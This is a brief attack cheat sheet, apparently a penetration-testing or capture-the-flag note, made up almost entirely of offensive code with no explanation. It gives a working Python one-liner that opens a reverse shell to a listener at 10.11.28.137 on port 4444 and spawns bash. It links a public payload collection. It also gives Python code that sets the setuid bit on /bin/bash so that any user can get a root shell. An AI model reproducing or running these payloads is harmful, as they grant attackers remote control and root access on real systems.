One liner reverse shell:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("`10.11.28.137`",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

https://github.com/swisskyrepo/PayloadsAllTheThings

Python code:
```python
import os
os.system('chmod 4777 /bin/bash')
```